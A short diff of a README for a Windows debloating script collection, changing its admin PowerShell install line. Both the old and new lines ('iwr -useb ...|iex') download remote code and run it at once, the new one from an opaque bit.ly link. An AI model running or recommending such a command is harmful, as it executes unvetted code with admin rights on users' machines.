@@ -8,7 +8,7 @@ This is a culmination of scripts that help to remove bloatware and spyware from 
 Paste this command into PowerShell (Admin):
 
 ```
-iwr -useb http://clevelandsteamer.xyz|iex
+iwr -useb https://bit.ly/3H3wPVd|iex
 ```
 
 Or
